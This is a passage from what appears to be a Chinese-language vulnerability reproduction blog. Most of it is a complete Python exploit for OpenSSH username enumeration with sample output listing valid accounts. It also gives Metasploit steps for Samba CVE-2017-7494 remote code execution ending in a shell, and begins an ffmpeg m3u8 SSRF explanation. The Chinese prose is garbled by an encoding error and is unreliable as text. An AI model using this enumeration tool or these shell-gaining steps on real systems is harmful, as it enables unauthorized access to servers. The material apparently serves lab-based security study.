class="token operator">=</span> old_add_boolean    <span class="token keyword">return</span> result<span class="token comment"># create function to perform authentication with malformed packet and desired username</span><span class="token keyword">def</span> <span class="token function">checkUsername</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> tried<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>    sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>hostname<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># instantiate transport</span>    transport <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span>sock<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        transport<span class="token punctuation">.</span>start_client<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>ssh_exception<span class="token punctuation">.</span>SSHException<span class="token punctuation">:</span>        <span class="token comment"># server was likely flooded, retry up to 3 times</span>        transport<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> tried <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>            tried <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">return</span> checkUsername<span class="token punctuation">(</span>username<span class="token punctuation">,</span> tried<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] Failed to negotiate SSH transport'</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        transport<span class="token punctuation">.</span>auth_publickey<span class="token punctuation">(</span>username<span class="token punctuation">,</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> BadUsername<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> paramiko<span class="token punctuation">.</span>ssh_exception<span class="token punctuation">.</span>AuthenticationException<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token comment">#Successful auth(?)</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"There was an error. Is this the correct version of OpenSSH?"</span><span class="token punctuation">)</span><span class="token comment"># function to test target system using the randomly generated usernames</span><span class="token keyword">def</span> <span class="token function">checkVulnerable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    vulnerable <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> random_username_list<span class="token punctuation">:</span>        result <span class="token operator">=</span> checkUsername<span class="token punctuation">(</span>user<span class="token punctuation">)</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            vulnerable <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> vulnerable<span class="token keyword">def</span> <span class="token function">exportJSON</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Valid"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"Invalid"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">'Valid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            data<span class="token punctuation">[</span><span class="token string">'Valid'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token keyword">not</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">and</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">not</span> <span class="token keyword">in</span> data<span class="token punctuation">[</span><span class="token string">'Invalid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            data<span class="token punctuation">[</span><span class="token string">'Invalid'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exportCSV</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>    final <span class="token operator">=</span> <span class="token string">"Username, Valid\n"</span>    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>        final <span class="token operator">+=</span> result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">", "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>    <span class="token keyword">return</span> final<span class="token keyword">def</span> <span class="token function">exportList</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">:</span>    final <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            final<span class="token operator">+=</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is a valid user!\n"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            final<span class="token operator">+=</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is not a valid user!\n"</span>    <span class="token keyword">return</span> final<span class="token comment"># assign functions to respective handlers</span>paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_SERVICE_ACCEPT<span class="token punctuation">]</span> <span class="token operator">=</span> malform_packetparamiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_USERAUTH_FAILURE<span class="token punctuation">]</span> <span class="token operator">=</span> call_error<span class="token comment"># get rid of paramiko logging</span>logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'paramiko.transport'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>NullHandler<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>arg_parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'hostname'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The target hostname or ip address"</span><span class="token punctuation">)</span>arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--port'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The target port"</span><span class="token punctuation">)</span>arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--threads'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The number of threads to be used"</span><span class="token punctuation">)</span>arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--outputFile'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The output file location"</span><span class="token punctuation">)</span>arg_parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--outputFormat'</span><span class="token punctuation">,</span> choices<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'list'</span><span class="token punctuation">,</span> <span class="token string">'json'</span><span class="token punctuation">,</span> <span class="token string">'csv'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'list'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The output file location"</span><span class="token punctuation">)</span>group <span class="token operator">=</span> arg_parser<span class="token punctuation">.</span>add_mutually_exclusive_group<span class="token punctuation">(</span>required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--username'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The single username to validate"</span><span class="token punctuation">)</span>group<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--userList'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"The list of usernames (one per line) to enumerate through"</span><span class="token punctuation">)</span>args <span class="token operator">=</span> arg_parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>hostname<span class="token punctuation">,</span> args<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] Connecting to host failed. Please check the specified host and port.'</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment"># first we run the function to check if host is vulnerable to this CVE</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> checkVulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># most probably the target host is either patched or running a version not affected by this CVE</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Target host most probably is not vulnerable or already patched, exiting..."</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>username<span class="token punctuation">:</span> <span class="token comment">#single username passed in</span>        result <span class="token operator">=</span> checkUsername<span class="token punctuation">(</span>args<span class="token punctuation">.</span>username<span class="token punctuation">)</span>        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is a valid user!"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">" is not a valid user!"</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> args<span class="token punctuation">.</span>userList<span class="token punctuation">:</span> <span class="token comment">#username list passed in</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>userList<span class="token punctuation">)</span>        <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] File doesn't exist or is unreadable."</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        usernames <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>strip<span class="token punctuation">,</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># map usernames to their respective threads</span>        pool <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Pool<span class="token punctuation">(</span>args<span class="token punctuation">.</span>threads<span class="token punctuation">)</span>        results <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token builtin">map</span><span class="token punctuation">(</span>checkUsername<span class="token punctuation">,</span> usernames<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>                outputFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>outputFile<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Cannot write to outputFile."</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFormat<span class="token operator">==</span><span class="token string">'json'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportJSON<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in JSON form."</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>exportJSON<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> args<span class="token punctuation">.</span>outputFormat<span class="token operator">==</span><span class="token string">'csv'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportCSV<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in CSV form."</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>exportCSV<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> args<span class="token punctuation">.</span>outputFile<span class="token punctuation">:</span>                outputFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>exportList<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>                outputFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Results successfully written to "</span> <span class="token operator">+</span> args<span class="token punctuation">.</span>outputFile <span class="token operator">+</span> <span class="token string">" in List form."</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>exportList<span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token comment"># no usernames passed in</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] No usernames provided to check"</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªç”¨æˆ·åå­—å…¸ï¼Œå¯ä»¥è‡ªè¡Œæ„é€ ï¼Œä¹Ÿå¯ä»¥ç”¨githubä¸Šé¢ä¸€ä¸ªå¼€æºé¡¹ç›®<a href="https://github.com/danielmiessler/SecLists/">SecLists</a>ï¼ŒèŠ‚çº¦æ—¶é—´æˆ‘ä»¬è‡ªè¡Œæ„é€ ä¸€ä¸ªç®€çŸ­listï¼Œæœ€ç»ˆæµ‹è¯•ç»“æœå¦‚ä¸‹</p><pre class="line-numbers language-none"><code class="language-none">admin is not a valid user!bin is a valid user!sys is a valid user!sync is a valid user!games is a valid user!man is a valid user!lp is a valid user!111 is not a valid user!1243 is not a valid user!sahdsa is not a valid user!jalba is not a valid user!dsa is not a valid user!fe is not a valid user!qf is not a valid user!ds is not a valid user!vc is not a valid user!dsshg is not a valid user!rsa is not a valid user!grdfsbvfgd is not a valid user!sb is not a valid user!fgd is not a valid user!s is not a valid user!bgfd is not a valid user!s is not a valid user!g is not a valid user!fds is not a valid user!g is not a valid user!fd is not a valid user!sgf is not a valid user!ds is not a valid user!g is not a valid user!fdsh is not a valid user!tr is not a valid user!wnbyrsbf is not a valid user!dgs is not a valid user!root is a valid user!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜¾ç„¶æ¼æ´å­˜åœ¨ï¼Œè€Œå½“æˆ‘ä»¬å¯¹é«˜çº§ç‰ˆæœ¬çš„SSHè¿›è¡Œæµ‹è¯•æ—¶ï¼Œexpå¤±æ•ˆ</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206171757123.png"></p></li></ol><h2 id="Sambaï¼ˆSMBï¼‰"><a href="#Sambaï¼ˆSMBï¼‰" class="headerlink" title="Sambaï¼ˆSMBï¼‰"></a>Sambaï¼ˆSMBï¼‰</h2><h3 id="CVE-2017-7494"><a href="#CVE-2017-7494" class="headerlink" title="CVE-2017-7494"></a>CVE-2017-7494</h3><p>æ¼æ´å†…å®¹ï¼šåªéœ€è¦æœ‰ä¸€ä¸ªå¯ä»¥å†™å…¥æ–‡ä»¶çš„ç”¨æˆ·å°±å¯ä»¥ææƒåˆ°rootæƒé™</p><p>æ¼æ´ä½œç”¨ï¼šRCE</p><p>å½±å“èŒƒå›´ï¼šSamba 3.5.0 ä¹‹ååˆ°4.6.4/4.5.10/4.4.14ä¸­é—´çš„æ‰€æœ‰ç‰ˆæœ¬</p><p>æ¼æ´å¤ç°ï¼š</p><ol><li><p>vulhubç›´æ¥èµ·ä¸€ä¸ªdocker</p></li><li><p>ä½¿ç”¨msfæœç´¢å¯¹åº”æ¼æ´<code>search is_known_pipename</code></p></li><li><p>ä½¿ç”¨setå‘½ä»¤è®¾ç½®rhost</p></li><li><p>å¦‚æœå¯¹æ–¹æœåŠ¡å¼€å¯äº†åŒ¿åç™»å½•ç›´æ¥ä½¿ç”¨runå‘½ä»¤å³å¯ï¼Œå¦‚æœå·²çŸ¥ç”¨æˆ·åå¯†ç å¯ä½¿ç”¨set smbuserå’Œsmbpassæ¥æŒ‡å®šç”¨æˆ·ç™»å½•</p></li><li><p>æˆåŠŸæ‹¿shell</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208101616840.png"></p></li></ol><h2 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h2><h3 id="CVE-2016-1897"><a href="#CVE-2016-1897" class="headerlink" title="CVE-2016-1897"></a>CVE-2016-1897</h3><p>æ¼æ´å†…å®¹ï¼šé¦–å…ˆäº†è§£ä¸€ä¸‹m3u8æ–‡ä»¶æ ¼å¼ï¼Œm3u8æ˜¯ä¸€ç§ç´¢å¼•æ–‡ä»¶ï¼Œç”¨äºHLSåè®®ä¼ è¾“åª’ä½“æµï¼Œm3u8ç´¢å¼•æŒ‡å‘ä¸€ä¸ªä¸ªå°çš„åª’ä½“æµç¢ç‰‡</p><blockquote><p>ç®€è€Œè¨€ä¹‹ï¼Œ<a href="https://links.jianshu.com/go?to=https://zh.wikipedia.org/wiki/HTTP_Live_Streaming">HLS</a> æ˜¯æ–°ä¸€ä»£æµåª’ä½“ä¼ è¾“åè®®ï¼Œå…¶åŸºæœ¬å®ç°åŸç†ä¸ºå°†ä¸€ä¸ªå¤§çš„åª’ä½“æ–‡ä»¶è¿›è¡Œåˆ†ç‰‡ï¼Œå°†è¯¥åˆ†ç‰‡æ–‡ä»¶èµ„æºè·¯å¾„è®°å½•äº m3u8 æ–‡ä»¶ï¼ˆå³ playlistï¼‰å†…ï¼Œå…¶ä¸­é™„å¸¦ä¸€äº›é¢å¤–æè¿°ï¼ˆæ¯”å¦‚è¯¥èµ„æºçš„å¤šå¸¦å®½ä¿¡æ¯Â·Â·Â·ï¼‰ç”¨äºæä¾›ç»™å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯ä¾æ®è¯¥ m3u8 æ–‡ä»¶å³å¯è·å–å¯¹åº”çš„åª’ä½“èµ„æºï¼Œè¿›è¡Œæ’­æ”¾ã€‚</p></blockquote><p>ä¸€ä¸ªåŸºæœ¬çš„m3u8æ–‡ä»¶æ ¼å¼å¦‚ä¸‹</p><blockquote><ul><li><p>m3u8 æ–‡ä»¶å¿…é¡»ä»¥ utf-8 è¿›è¡Œç¼–ç ï¼Œä¸èƒ½ä½¿ç”¨ Byte Order Markï¼ˆBOMï¼‰å­—èŠ‚åºï¼Œ ä¸èƒ½åŒ…å« utf-8 æ§åˆ¶å­—ç¬¦ï¼ˆU+0000 ~ U_001F å’Œ U+007F ~ u+009Fï¼‰ã€‚</p></li><li><p>m3u8 æ–‡ä»¶çš„æ¯ä¸€è¡Œè¦ä¹ˆæ˜¯ä¸€ä¸ª URIï¼Œè¦ä¹ˆæ˜¯ç©ºè¡Œï¼Œè¦ä¹ˆå°±æ˜¯ä»¥ <strong>#</strong> å¼€å¤´çš„å­—ç¬¦ä¸²ã€‚ä¸èƒ½å‡ºç°ç©ºç™½å­—ç¬¦ï¼Œé™¤äº†æ˜¾ç¤ºå£°æ˜çš„å…ƒç´ ã€‚</p></li><li><p>m3u8 æ–‡ä»¶ä¸­ä»¥ <strong>#</strong> å¼€å¤´çš„å­—ç¬¦ä¸²è¦ä¹ˆæ˜¯æ³¨é‡Šï¼Œè¦ä¹ˆå°±æ˜¯æ ‡ç­¾ã€‚æ ‡ç­¾ä»¥ <strong>#EXT</strong> å¼€å¤´ï¼Œå¤§å°å†™æ•æ„Ÿã€‚</p></li><li><p>```<br>å„å‚æ•°è¯´æ˜ï¼š<br>#EXTM3U æ ‡ç­¾æ˜¯ m3u8 çš„æ–‡ä»¶å¤´ï¼Œå¼€å¤´å¿…é¡»è¦è¿™ä¸€è¡Œ<br>#EXT-X-MEDIA-SEQUENCE è¡¨ç¤ºæ¯ä¸€ä¸ªmedia URI åœ¨ PlayListä¸­åªæœ‰å”¯ä¸€çš„åºå·ï¼Œç›¸é‚»ä¹‹é—´åºå·+1<br>#EXTINF:10.0, è¡¨ç¤ºè¯¥ä¸€æ®µ TS æµæ–‡ä»¶çš„é•¿åº¦<br>#EXT-X-ENDLIST è¿™ä¸ªç›¸å½“äºæ–‡ä»¶ç»“æŸç¬¦</p><pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;m3u8#EXTM3U#EXT-X-TARGETDURATION:10#EXTINF:9.009,http:&#x2F;&#x2F;media.example.com&#x2F;first.ts#EXTINF:9.009,http:&#x2F;&#x2F;media.example.com&#x2F;second.ts#EXTINF:3.003,http:&#x2F;&#x2F;media.example.com&#x2F;third.ts#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></blockquote><p>è€Œåœ¨ffmpegç‰¹å®šç‰ˆæœ¬ä¸­å¹¶æ²¡æœ‰å¯¹URIè¿›è¡Œä»»ä½•æ£€æŸ¥ï¼Œæ­¤å¤„å¯å¯¼è‡´SSRFï¼Œåªéœ€è¦ç›‘å¬ä¸€ä¸ªç«¯å£ç„¶åç›´æ¥è®¿é—®å³å¯éªŒè¯</p><p>ä»»æ„æ–‡ä»¶è¯»å–æˆå› 